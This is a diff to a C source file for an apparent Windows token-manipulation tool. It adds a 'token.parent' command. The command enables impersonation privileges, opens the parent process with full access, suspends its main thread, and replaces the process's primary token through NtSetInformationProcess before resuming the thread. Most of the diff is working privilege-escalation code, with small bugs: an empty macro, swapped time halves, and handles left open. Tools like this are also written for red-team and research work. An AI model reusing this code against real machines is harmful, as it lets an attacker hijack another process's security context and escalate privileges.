@@ -9,7 +9,13 @@
 #include "token.h"
 #include "privileges.h"
 
-typedef unsigned long DWORD;
+#ifndef MAKEULONGLONG
+#define MAKEULONGLONG(ldw, hdw) 
+#endif
+
+#ifndef MAXULONGLONG
+#define MAXULONGLONG ((ULONGLONG)~((ULONGLONG)0))
+#endif
 
 #define MAX_COMMAND_BUFFER_LEN 256
 #define PROMPT "\n# "
@@ -132,6 +138,111 @@ int main()
             printf("\n");
 
             is_impersonating = impersonate(&availableTokens[token_id]);
+        }
+        else if (strcmp(command_buf, "token.parent") == 0)
+        {
+            if (!enable_privilege(is_impersonating, SE_IMPERSONATE_NAME))
+            {
+                printf("[!] SeImpersonatePrivilege is needed for setting the parents token");
+                continue;
+            }
+
+            if (!enable_privilege(is_impersonating, SE_ASSIGNPRIMARYTOKEN_NAME))
+            {
+                printf("[!] SeAssignPrimaryToken is needed for setting the parents token");
+                continue;
+            }
+
+            Token availableTokens[1024];
+            list_available_tokens(availableTokens);
+
+            printf("Enter token ID to use: ");
+            int token_id;
+            scanf_s("%d", &token_id);
+            printf("\n");
+
+            // Set parents impersonation token to the chosen token
+            
+            // Get parent PID
+            HANDLE hSnapshots = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            PROCESSENTRY32 currProcessEntry = { 0 };
+            currProcessEntry.dwSize = sizeof(PROCESSENTRY32);
+            if (Process32First(hSnapshots, &currProcessEntry))
+            {
+                do 
+                {
+                    if (currProcessEntry.th32ProcessID == GetCurrentProcessId())
+                    {
+                        printf("[*] PPID: %i\n", currProcessEntry.th32ParentProcessID);
+                        break;
+                    }
+                } while (Process32Next(hSnapshots, &currProcessEntry));
+            }
+            CloseHandle(hSnapshots);
+
+            // Get handle to parent proc 
+            HANDLE hParentProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, currProcessEntry.th32ParentProcessID);
+
+            // Get main thread of parent proc
+            DWORD dwMainThreadID = 0;
+            HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+            THREADENTRY32 currThreadHandle;
+            ULONGLONG ullMinCreateTime = MAXULONGLONG;
+            currThreadHandle.dwSize = sizeof(THREADENTRY32);
+            if (Thread32First(hThreadSnap, &currThreadHandle))
+            {
+                do
+                {
+                    if (currThreadHandle.th32OwnerProcessID == currProcessEntry.th32ParentProcessID)
+                    {
+                        HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, currThreadHandle.th32ThreadID);
+                        if (hThread) 
+                        {
+                            FILETIME afTimes[4] = { 0 };
+                            if (GetThreadTimes(hThread, &afTimes[0], &afTimes[1], &afTimes[2], &afTimes[3])) 
+                            {
+                                ULONGLONG ullTest = (((ULONGLONG)(afTimes[0].dwLowDateTime)) << 32) | ((afTimes[0].dwHighDateTime) & 0xFFFFFFFF);
+                                if (ullTest && ullTest < ullMinCreateTime)
+                                {
+                                    ullMinCreateTime = ullTest;
+                                    dwMainThreadID = currThreadHandle.th32ThreadID;
+                                }
+                            }
+                            CloseHandle(hThread);
+                        }
+                    }
+                } while (Thread32Next(hThreadSnap, &currThreadHandle));
+            }
+            CloseHandle(hThreadSnap);
+
+            printf("[*] Suspending thread %d", dwMainThreadID);
+            HANDLE remoteThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwMainThreadID);
+            if (SuspendThread(remoteThread) == (DWORD)-1)
+            {
+                printf("[!] Error suspending thread with ID %d: %d", dwMainThreadID, GetLastError());
+                continue;
+            }
+
+            // NtSetInformationProcess to set thread token
+            PROCESS_ACCESS_TOKEN tokenInfo;
+            tokenInfo.Token = availableTokens[token_id].tokenHandle;
+            tokenInfo.Thread = 0;
+            printf("[*] Setting token for thread %d", dwMainThreadID);
+            NTSTATUS setInfoResult = sNtSetInformationProcess(hParentProc, 9, &tokenInfo, sizeof(PROCESS_ACCESS_TOKEN)); // 9 = ProcessAccessToken
+            if (setInfoResult < 0)
+            {
+                wprintf(L"Error setting token: 0x%08x. Err: %d\n", setInfoResult, GetLastError());
+                continue;
+            }
+            
+            printf("[*] Resuming thread %d", dwMainThreadID);
+            if (!ResumeThread(remoteThread))
+            {
+                printf("[!] Error resuming thread with ID %d: %d", dwMainThreadID, GetLastError());
+            }
+            
+            // TODO: close handles
+            continue;
         }
         else if (strcmp(command_buf, "token.revert") == 0)
         {
